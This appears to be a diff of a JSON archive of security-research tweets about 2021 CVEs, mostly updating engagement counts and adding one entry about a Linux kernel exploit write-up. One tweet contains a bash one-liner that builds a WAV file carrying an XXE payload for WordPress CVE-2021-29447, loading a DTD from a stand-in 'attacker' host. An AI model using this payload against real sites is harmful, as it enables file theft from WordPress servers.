@@ -1,8 +1,8 @@
 {
-    "tweetfavorites": 289,
+    "tweetfavorites": 283,
     "tweetquotes": 2,
     "tweetreplies": 2,
-    "tweetretweets": 129,
+    "tweetretweets": 125,
     "tweettext": "CVE-2021-29447 #WordPress XXE: you don't need a wave file to set iXML metadata! bash:\n\necho -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://attacker/evil.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; payload.wav https://t.co/2WPTRGC3ms",
     "tweettime": "2021-04-29, 09:40:52",
     "tweeturl": "https://twitter.com/AndreaTheMiddle/status/1387703420044386310",
@@ -113,10 +113,10 @@
         "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27059",
         "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-27085"
     ],
-    "tweetfavorites": 399,
+    "tweetfavorites": 385,
     "tweetquotes": 8,
     "tweetreplies": 3,
-    "tweetretweets": 199,
+    "tweetretweets": 188,
     "tweettext": "Microsoft Office Remote Code Execution Vulnerability(CVE-2021-27059)\nInternet Explorer Remote Code Execution Vulnerability(CVE-2021-27085)\n0day(exploit) in the Wild But no one talk about it😅\nhttps://t.co/AYawN0X30A\nhttps://t.co/G2RYjq9dQ5 https://t.co/uUkGQJ147x",
     "tweettime": "2021-04-22, 02:45:15",
     "tweeturl": "https://twitter.com/blackorbird/status/1385062113085825027",
@@ -136,10 +136,10 @@
     "expanded_url": [
         "https://www.cloaked.pl/2021/04/cve-2021-26415/"
     ],
-    "tweetfavorites": 450,
+    "tweetfavorites": 437,
     "tweetquotes": 5,
     "tweetreplies": 7,
-    "tweetretweets": 221,
+    "tweetretweets": 210,
     "tweettext": "Here's a promised write-up of Windows Privilege Elevation bug that I've discovered / CVE-2021-26415\nhttps://t.co/1uQoF9wAip\n\n#security #EOP #LPE #bugbounty https://t.co/VJzEcXw4tu",
     "tweettime": "2021-04-21, 19:46:42",
     "tweeturl": "https://twitter.com/a_denkiewicz/status/1384956782200725504",
@@ -269,7 +269,7 @@
     "expanded_url": [
         "https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1647.html"
     ],
-    "tweetfavorites": 547,
+    "tweetfavorites": 546,
     "tweetquotes": 6,
     "tweetreplies": 5,
     "tweetretweets": 229,
@@ -341,10 +341,10 @@
     "expanded_url": [
         "https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html"
     ],
-    "tweetfavorites": 498,
+    "tweetfavorites": 484,
     "tweetquotes": 4,
     "tweetreplies": 1,
-    "tweetretweets": 211,
+    "tweetretweets": 204,
     "tweettext": "[New Blog] Exploiting Windows RPC to bypass CFG mitigation: analysis of CVE-2021-26411 in-the-wild sample\nhttps://t.co/mmM0B9BzN3 https://t.co/kxR7HWkueb",
     "tweettime": "2021-04-10, 09:46:07",
     "tweeturl": "https://twitter.com/iamelli0t/status/1380819370755072001",
@@ -362,6 +362,21 @@
     "tweettime": "2021-04-09, 17:56:59",
     "tweeturl": "https://twitter.com/jedisct1/status/1380580516722831360",
     "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html",
+        "https://a13xp0p0v.github.io/img/CVE-2021-26708.pdf",
+        "https://www.youtube.com/watch?v=EC8PFOYOUgU"
+    ],
+    "tweetfavorites": 454,
+    "tweetquotes": 4,
+    "tweetreplies": 2,
+    "tweetretweets": 199,
+    "tweettext": "My write-up covering #Zer0Con2021 talk!\n\nFour Bytes of Power: exploiting CVE-2021-26708 in the Linux kernel\nhttps://t.co/GLukmZ7b1y\n\n#Zer0Con2021 slides: https://t.co/rIOnakyr7A\n\nPoC exploit demo video: https://t.co/2ceeuiffq6\n\nEnjoy! https://t.co/JqSeuM2foX",
+    "tweettime": "2021-04-09, 08:32:16",
+    "tweeturl": "https://twitter.com/a13xp0p0v/status/1380438401053245446",
+    "username": "a13xp0p0v"
 }
 {
     "tweetfavorites": 0,
@@ -481,10 +496,10 @@
     "expanded_url": [
         "https://github.com/r4j0x00/exploits/tree/master/CVE-2020-16040"
     ],
-    "tweetfavorites": 830,
+    "tweetfavorites": 814,
     "tweetquotes": 4,
     "tweetreplies": 7,
-    "tweetretweets": 245,
+    "tweetretweets": 236,
     "tweettext": "I wrote a 1day exploit for chrome CVE-2020-16040. It includes a typer hardening bypass. Works for chrome version &lt;= 87.0.4280.88\nhttps://t.co/mUkyj3GTlD https://t.co/6x9xoorB3C",
     "tweettime": "2021-04-05, 11:15:45",
     "tweeturl": "https://twitter.com/r4j0x00/status/1379029992265293830",
